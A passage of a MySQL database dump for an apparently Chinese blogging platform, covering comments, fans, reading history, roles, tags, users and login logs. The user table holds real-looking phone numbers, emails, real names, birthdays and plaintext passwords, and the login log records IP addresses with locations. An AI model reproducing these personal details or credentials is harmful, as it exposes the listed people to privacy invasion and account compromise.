的基本使用','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk6yaAAE0QAAFZz1MkotY65.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','😭😚😚😚','2022-05-13 18:47:37',NULL,NULL),('220513DBM2NABZ0H','220226DP09K1F0SW','0','220424A7NM5WNA14','Java IO','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk7OaARNJ_AADzsBlCvrI38.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','😃😃😃','2022-05-13 18:47:53',NULL,NULL),('220513DBRN3FFP28','220226DP09K1F0SW','0','220424A8P039F614','基础架构：一条SQL查询语句是如何执行的','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk7ZiAK07GAAA1Jtkfplc01.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','😂😂😂','2022-05-13 18:48:16',NULL,NULL),('2205148HPGMG45WH','220226DP09K1F0SW','0','220403CSY0BRPBR4','FastDFS','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJb4OAHSnVAAAQ6GF1LMQ991.png','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','😘😘','2022-05-14 12:02:48',NULL,NULL),('2205148M5RARBHX4','220226DP09K1F0SW','0','220403CRCRB6P0ZC','SpringBoot','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbnCAdoN_AAARlBZAB7Q62.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','😂😂😂😂','2022-05-14 12:07:13',NULL,NULL),('2205148M7P0FGF80','220226DP09K1F0SW','0','220403CRCRB6P0ZC','SpringBoot','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbnCAdoN_AAARlBZAB7Q62.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','👌👌','2022-05-14 12:07:26',NULL,NULL);
/*!40000 ALTER TABLE `t_comment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_fans`
--

DROP TABLE IF EXISTS `t_fans`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_fans` (
  `id` varchar(24) NOT NULL,
  `author` varchar(24) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `fan_id` varchar(24) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `face` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `fan_nickname` varchar(16) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `sex` int NOT NULL,
  `province` varchar(16) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `writer_id` (`author`,`fan_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='\r\n';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_fans`
--

LOCK TABLES `t_fans` WRITE;
/*!40000 ALTER TABLE `t_fans` DISABLE KEYS */;
INSERT INTO `t_fans` VALUES ('2205088H13XW25AW','220226DP09K1F0SW','12','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJUJ-WAU9CmAAGxCjYNWhM729.jpg','奇点',1,'上海'),('2205088N4FDZBW28','220226DP09K1F0SW','2205088MN2A3X1P0','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3QkyABO9_AABu6KdncRk77.jpeg','灿烂人生',1,'河北'),('2205088NHHFW72FW','220226DP09K1F0SW','2205088N7A8RWR68','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3QraAatt5AABe1PQUe9A04.jpeg','鲸落',0,'安徽'),('220513ASF5N2BDYW','220226DP09K1F0SW','2205088H55FW0Y3C','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3QUSAcuyfAACQ8lkwt-w07.jpeg','诗酒趁年华',1,'天津');
/*!40000 ALTER TABLE `t_fans` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_history`
--

DROP TABLE IF EXISTS `t_history`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_history` (
  `id` varchar(32) DEFAULT NULL,
  `user_id` varchar(32) DEFAULT NULL,
  `create_time` timestamp NULL DEFAULT NULL,
  `article_id` varchar(32) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_history`
--

LOCK TABLES `t_history` WRITE;
/*!40000 ALTER TABLE `t_history` DISABLE KEYS */;
INSERT INTO `t_history` VALUES ('220512ARDPMF24PH','220226DP09K1F0SW','2022-05-14 04:08:20','220403CSAF3Z1N9P'),('220513DBD1X7MSNC','220226DP09K1F0SW','2022-05-13 10:47:20','220424A55D2YRZTC'),('220513DBH8WF7MW0','220226DP09K1F0SW','2022-05-13 10:47:41','220424A7NM5WNA14'),('220513DBMT9NA2CH','220226DP09K1F0SW','2022-05-13 10:47:57','220424A8P039F614'),('220513DBSW2N4P6W','220226DP09K1F0SW','2022-05-13 10:49:14','220403CT2P7T6RP0'),('220513DYM971ZPSW','220226DP09K1F0SW','2022-05-16 11:19:20','220403CS5RY4HM80'),('220513DZY1A2HMY8','220226DP09K1F0SW','2022-05-14 12:04:24','220403CSY0BRPBR4'),('2205148KYKKS2614','220226DP09K1F0SW','2022-05-16 11:19:41','220403CRCRB6P0ZC'),('220516DSAK893C94','220226DP09K1F0SW','2022-05-16 11:20:06','220424A5S09T3WPH'),('220517BZMS8D9XWH','220226DP09K1F0SW','2022-05-17 08:47:51','220517BW92FCZ06W'),('220517BZR0ADCKKP','220226DP09K1F0SW','2022-05-17 08:48:05','220517BY1PM0TZ9P'),('220517BZYF9MWTF8','220226DP09K1F0SW','2022-05-17 08:48:48','220517BYAS47G0X4'),('220517C1MTC46MRP','220226DP09K1F0SW','2022-05-17 08:54:03','220517BWRZ2S8ZC0');
/*!40000 ALTER TABLE `t_history` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_role`
--

DROP TABLE IF EXISTS `t_role`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_role` (
  `id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '角色id',
  `role_name` varchar(255) NOT NULL COMMENT '角色名',
  `create_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT '创建时间',
  `update_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT '更新时间',
  `status` tinyint unsigned NOT NULL DEFAULT '1' COMMENT '状态',
  `summary` varchar(255) DEFAULT NULL COMMENT '角色介绍',
  `category_menu_ids` text CHARACTER SET utf8 COLLATE utf8_general_ci COMMENT '角色管辖的菜单的UID',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_role`
--

LOCK TABLES `t_role` WRITE;
/*!40000 ALTER TABLE `t_role` DISABLE KEYS */;
INSERT INTO `t_role` VALUES ('434994947c5a4ee3a710cd277357c7c3','超级管理员','2018-10-15 23:56:26','2021-02-23 05:06:57',1,'超级管理员，管理全部菜单和功能','[\"147cd431cbb9007bde87444d7987b151\",\"152216a4fd9b995aa20bfa1eec6312c2\",\"238352fc7e86340c339b9a575b1b7086\",\"2fb47d3b6dbd44279c8206740a263543\",\"49b42250abcb47ff876bad699cf34f03\",\"510483ce569b4fc88299f346147b1314\",\"6606b7e646d545e5a25c70b5e5fade9f\",\"78f24799307cb63bc3759413dadf4d1a\",\"879cfcd4dfd3e5bc1bb6ea2c0f1f82c0\",\"9002d1ae905c4cb79c2a485333dad2f7\",\"93f7fd9a6e81735c47649e6b36042b5d\",\"9449ce5dd5e24b21a9d15f806cb36e87\",\"9beb7caa2c844b36a02789262dc76fbe\",\"a0c40ddd3fe15bb3f2edf9ec242a1511\",\"a9396f1a3fbdec3d4cb614f388a22bea\",\"baace3dc03d34c54b81761dce8243814\",\"badf0010422b432ba6ec9c83a25012ed\",\"bcf4a9bc21c14b559bcb015fb7912266\",\"bfc9463e59a3ca250dcfc1c86627e034\",\"c519725da92b42f3acf0cc9fad58c664\",\"cbd7ba11c1b38c66b569405ed9185f35\",\"d4d92c53d3614d00865e9219b8292a90\",\"e1e54aea65cc22d9f8a4c74ce8d23749\",\"e4a482c089d04a30b6ecbaadb81b70f8\",\"f9276eb8e3274c8aa05577c86e4dc8c1\",\"fb4237a353d0418ab42c748b7c1d64c6\",\"1f01cd1d2f474743b241d74008b12333\",\"0a035547bbec404eb3ee0ef43312148d\"]');
/*!40000 ALTER TABLE `t_role` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_system_config`
--

DROP TABLE IF EXISTS `t_system_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_system_config` (
  `id` varchar(32) DEFAULT NULL,
  `create_time` timestamp NULL DEFAULT NULL,
  `update_time` timestamp NULL DEFAULT NULL,
  `upload_local` mediumtext,
  `editor_model` tinyint DEFAULT NULL,
  `theme_color` varchar(12) DEFAULT NULL,
  `search_model` tinyint DEFAULT NULL,
  `local_pic_url` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='系统配置表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_system_config`
--

LOCK TABLES `t_system_config` WRITE;
/*!40000 ALTER TABLE `t_system_config` DISABLE KEYS */;
INSERT INTO `t_system_config` VALUES ('37d492e35dc6e3fbb9dfedfd2079a123','2020-01-29 19:14:26','2022-05-12 02:20:43','0',0,'#6E6EFE',1,'http://127.0.0.1/home/pic');
/*!40000 ALTER TABLE `t_system_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_tag`
--

DROP TABLE IF EXISTS `t_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_tag` (
  `id` varchar(32) NOT NULL,
  `name` varchar(20) NOT NULL,
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `color` varchar(10) NOT NULL,
  `user_id` varchar(32) DEFAULT NULL,
  `sys` tinyint DEFAULT NULL,
  `create_time` timestamp NULL DEFAULT NULL,
  `update_time` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_tag`
--

LOCK TABLES `t_tag` WRITE;
/*!40000 ALTER TABLE `t_tag` DISABLE KEYS */;
INSERT INTO `t_tag` VALUES ('220329D180W7F2RP','Java','1','#14D1E6',NULL,1,'2022-03-29 02:16:46','2022-03-31 06:24:26'),('220329D488658SFW','Spring Boot','1','#A5F10F',NULL,1,'2022-03-29 02:25:49','2022-03-29 02:25:49'),('220329D4B48S3TR4','Linux','1','#E14212',NULL,1,'2022-03-29 02:26:07','2022-04-03 03:21:53'),('220329D4CRPCTPSW','NoSQL','1','#9F9AA2',NULL,1,'2022-03-29 02:26:17','2022-03-29 02:26:17'),('220329D4G2NW2TMW','Redis','1','#C66E4E',NULL,1,'2022-03-29 02:26:32','2022-03-29 02:26:32'),('220329D4N9GNBDKP','工具','1','#6B7B4E',NULL,1,'2022-03-29 02:27:00','2022-03-29 02:27:00'),('220329D4RM2MM4PH','Spring','1','#A4AA97',NULL,1,'2022-03-29 02:27:14','2022-03-29 02:27:14'),('220329D4W4C5AH4H','MySQL','1','#2A9C52',NULL,1,'2022-03-29 02:27:31','2022-03-29 02:27:31'),('220329D4YFK68Y3C','算法','1','#16E197',NULL,1,'2022-03-29 02:27:46','2022-03-29 02:27:46'),('220329D50NPXCB2W','读书心得','1','#199DA2',NULL,1,'2022-03-29 02:28:00','2022-04-11 02:37:14'),('220329D53S7A6XYW','摄影专辑','1','#7AC7DE',NULL,1,'2022-03-29 02:28:20','2022-03-29 02:28:20'),('220329D57ZCM5R8H','人生感悟','1','#BCBEC8',NULL,1,'2022-03-29 02:28:47','2022-03-29 02:28:47'),('220329D5TZ12F0DP','MQ','1','#4158CD',NULL,1,'2022-03-29 02:30:30','2022-03-29 02:30:30'),('220329D686MGKT7C','计算机网络','1','#7A8ADA',NULL,1,'2022-03-29 02:31:49','2022-03-29 02:31:49'),('220329D6AKNYYWZC','操作系统','1','#AAE128',NULL,1,'2022-03-29 02:32:04','2022-03-29 02:32:04'),('220403CS5RZ78CPH','JVM','1','#409eff','220226DP09K1F0SW',0,'2022-04-03 01:55:31','2022-04-03 01:55:31'),('220414DPDB6K7A14','音乐','1','#409eff','220226DP09K1F0SW',0,'2022-04-14 03:14:24','2022-04-14 03:14:24'),('220414DPDBBTZ8BC','欧美','1','#409eff','220226DP09K1F0SW',0,'2022-04-14 03:14:24','2022-04-14 03:14:24'),('220424A4ABS92Z7C','ElasticSearch','1','#409eff','220226DP09K1F0SW',0,'2022-04-23 22:13:50','2022-04-23 22:13:50'),('220424A4ABSSR30H','搜索引擎','1','#409eff','220226DP09K1F0SW',0,'2022-04-23 22:13:50','2022-04-23 22:13:50'),('220424A55D325FRP','Git','1','#409eff','220226DP09K1F0SW',0,'2022-04-23 22:16:18','2022-04-23 22:16:18'),('220424A5S09T3WPK','docker','1','#409eff','220226DP09K1F0SW',0,'2022-04-23 22:18:04','2022-04-23 22:18:04'),('220424A62W7HXWX4','docker','1','#409eff','220226DP09K1F0SW',0,'2022-04-23 22:19:01','2022-04-23 22:19:01'),('220424A6RG0H9NMW','日志','1','#409eff','220226DP09K1F0SW',0,'2022-04-23 22:21:01','2022-04-23 22:21:01'),('220424A7NM5WNA15','IO','1','#409eff','220226DP09K1F0SW',0,'2022-04-23 22:23:49','2022-04-30 03:33:40'),('220517BTBACKD1AW','设计模式','1','#19BF1B',NULL,1,'2022-05-17 08:35:03','2022-05-17 08:35:03'),('220517BWRZ2XPFA8','Promise','1','#409eff','220226DP09K1F0SW',0,'2022-05-17 08:39:11','2022-05-17 08:39:11');
/*!40000 ALTER TABLE `t_tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_user`
--

DROP TABLE IF EXISTS `t_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_user` (
  `id` varchar(24) NOT NULL,
  `mobile` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `nickname` varchar(16) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `password` varchar(18) DEFAULT NULL,
  `face` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `real_name` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `email` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `sex` int DEFAULT NULL,
  `birthday` date DEFAULT NULL,
  `province` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `active_status` int NOT NULL DEFAULT '0',
  `create_time` timestamp NOT NULL,
  `update_time` timestamp NOT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `mobile` (`mobile`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_user`
--

LOCK TABLES `t_user` WRITE;
/*!40000 ALTER TABLE `t_user` DISABLE KEYS */;
INSERT INTO `t_user` VALUES ('12','110','奇点','123456','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJUJ-WAU9CmAAGxCjYNWhM729.jpg','小金姑娘','135318790@163.com',1,'2016-02-18','上海',1,'2022-02-23 06:35:55','2022-04-13 23:57:41'),('220226DP09K1F0SW','17796706221','快乐就像','123456','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','小张','17796706221@163.com',1,'1990-05-30','河南',1,'2022-02-25 21:13:00','2022-05-17 08:28:27'),('22042490HY8KW1KP','18236271235','okok',NULL,'https://cdn.qingweico.cn/blog/274080b281e5f0d31b7390207d78f591.jpeg','lyd','1685496067@qq.com',0,'2000-04-17','河南',1,'2022-04-23 20:38:27','2022-04-23 20:39:29'),('220427F60Z143G7C','15836239552','秀儿',NULL,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJpLyaAQiuIAACeTezZvMY796.jpg','王鹏皓','1060569439@qq.com',0,'1990-06-29','河南',1,'2022-04-27 03:55:06','2022-04-27 03:56:00'),('2205088H55FW0Y3C','17796706222','诗酒趁年华','123456','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3QUSAcuyfAACQ8lkwt-w07.jpeg','001','17796706222@163.com',1,'1998-06-15','天津',1,'2022-05-08 04:01:09','2022-05-13 07:07:38'),('2205088MN2A3X1P0','17796706223','灿烂人生','123456','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3QkyABO9_AABu6KdncRk77.jpeg','002','17796706223@163.com',1,'1999-10-12','河北',1,'2022-05-08 04:08:39','2022-05-08 04:10:01'),('2205088N7A8RWR68','17796706224','鲸落','123456','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3QraAatt5AABe1PQUe9A04.jpeg','003','17796706224@163.com',0,'2000-08-05','安徽',1,'2022-05-08 04:10:24','2022-05-08 04:11:17');
/*!40000 ALTER TABLE `t_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_user_login_log`
--

DROP TABLE IF EXISTS `t_user_login_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_user_login_log` (
  `id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `user_id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `login_location` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `ipaddr` varchar(32) NOT NULL,
  `browser` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `os` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `login_time` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_user_login_log`
--

LOCK TABLES `t_user_login_log` WRITE;
/*!40000 ALTER TABLE `t_user_login_log` DISABLE KEYS */;
INSERT INTO `t_user_login_log` VALUES ('2204209KGNT6WNHH','2204209KGH7SR9GC','河南省郑州市 联通','42.236.253.116','Chrome 10','Windows 10','2022-04-20 05:29:21'),('2204209W1M9XGC00','2204209W1KS201YW','河南省郑州市 联通','42.236.253.116','Chrome 10','Windows 10','2022-04-20 05:48:52'),('220420A67Y44MBXP','220226DP09K1F0SW','河南省郑州市 联通','42.236.253.116','Chrome 10','Windows 10','2022-04-20 06:19:34'),('220420AT9NYD9T7C','220226DP09K1F0SW','河南省郑州市 联通','42.236.253.116','Unknown','Unknown','2022-04-20 07:10:48'),('220420B58NTF4CPH','220226DP09K1F0SW','河南省郑州市 联通','42.236.253.116','Unknown','Unknown','2022-04-20 07:40:43'),('220420F0M2Z6AWZC','220226DP09K1F0SW','河南省郑州市 联通','115.60.149.140','Unknown','Unknown','2022-04-20 11:38:55'),('220420FHK1SPWDP0','220226DP09K1F0SW','河南省郑州市 联通','115.60.146.182','Unknown','Unknown','2022-04-20 12:26:51'),('22042192TAH57B9P','220226DP09K1F0SW','河南省郑州市 联通','115.60.148.107','Unknown','Unknown','2022-04-21 04:45:09'),('2204219X3KHA0CBC','2204219X3CAZHYCH','河南省郑州市 联通','115.60.147.137','Chrome 10','Windows 10','2022-04-21 05:52:05'),('220421D0A4D1PPX4','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-21 10:14:00'),('220421GG2ZMGZ9P0','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-21 13:46:24'),('220422BFW5R82GTC','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-22 08:09:24'),('220422FA0XTF09S8','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-22 12:07:06'),('220422FRBT59KDD4','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-22 12:41:18'),('220422HXCB8YHMY8','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Mobile Safari','Mac OS X (iPhone)','2022-04-22 15:41:31'),('2204237F9DZWYG54','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 02:31:33'),('2204238FN0S80Y3C','2204238FMYWGAM3C','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-04-23 03:56:38'),('2204239ZM5DTNGHH','2204239ZM51RXPM8','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-04-23 05:59:39'),('220423A3T6ATXH28','2204239ZM51RXPM8','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 06:12:12'),('220423A460RAYK40','220423A46036H37C','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-04-23 06:13:21'),('220423AN62TH6W00','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 06:58:24'),('220423ANGNSFKD40','220423ANGKXB0TTC','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-04-23 06:59:26'),('220423AP0NBMMRP0','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 07:00:49'),('220423APPSSR9PM8','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 07:02:59'),('220423AYF2TAHKKP','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 07:20:17'),('220423B1XCR8204H','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 07:30:30'),('220423B774T60KKP','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 07:46:33'),('220423B7BM59GC00','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 07:47:02'),('220423B8PR5K6GTC','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 07:51:01'),('220423B9Z6RDDWX4','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 07:54:43'),('220423CY65SN7NTC','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 10:07:34'),('220423DP3RGSPRWH','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-23 11:13:22'),('22042490HZYH45GC','22042490HY8KW1KP','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-04-24 04:38:27'),('2204249ATG3W2MCH','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-24 05:09:11'),('220425AHFKF5604H','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-25 06:50:19'),('220425F9CN9N0ARP','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-25 12:05:22'),('2204267PC2W1YDGC','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-26 02:49:50'),('2204268YXZC7XMNC','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-26 04:33:25'),('2204269Z3ZW193MW','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-26 05:58:08'),('220426CTDW1954M8','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-26 09:59:23'),('2204278H1RPZ7FK4','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-04-27 04:00:47'),('2204279AN4SG75D4','12','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:08:43'),('2204279ATWC0FPPH','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:09:13'),('2204279B0H4RXN9P','12','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:09:43'),('2204279CX973CS5P','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:15:23'),('2204279D56457HH0','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:16:13'),('2204279D9YDRF4PH','12','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:16:44'),('2204279DCM89HN7C','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:17:01'),('2204279F2P0AS7MW','12','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:18:57'),('2204279PAR99WR68','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:37:50'),('2204279SC1A88B2W','12','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:43:59'),('2204279SMTA8YN2W','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:44:42'),('2204279T3FX1MNC0','12','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:46:04'),('2204279T718MKWX4','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 05:46:27'),('220427F60ZKD911P','220427F60Z143G7C','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-04-27 11:55:06'),('220427FFFH5NGN54','220427F60Z143G7C','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-04-27 12:20:35'),('220427FGWX361028','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-04-27 12:24:41'),('220427G16MNKWYCH','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-27 13:04:46'),('220428C060CXB2FW','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-28 08:49:29'),('220428C3Y75SXXGC','220226DP09K1F0SW','河南省郑州市 联通','115.60.146.94','Unknown','Unknown','2022-04-28 09:00:40'),('220428H6TDKH4FNC','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-28 14:45:39'),('220430D66952M8M8','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-30 10:31:36'),('220430F03HTCGDKP','220427F60Z143G7C','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-04-30 11:37:22'),('2205027A40WHMTMW','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-02 02:18:57'),('2205027WK2PGRMA8','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-02 03:02:23'),('220503874WHP9D40','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-03 03:34:06'),('22050488K327CFA8','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-04 03:38:25'),('22050488N0Y5TXP0','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-04 03:38:37'),('2205048FFC1TN540','220226DP09K1F0SW','河南省郑州市 联通','115.60.148.92','Unknown','Unknown','2022-05-04 03:56:09'),('2205048GKMBRN8BC','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-04 03:59:29'),('2205048WBFMRKR8H','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-04 04:25:51'),('220504C8PH0F223C','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-04 09:15:04'),('220506970GZGKN9P','220226DP09K1F0SW','河南省郑州市 联通','115.60.151.126','Unknown','Unknown','2022-05-06 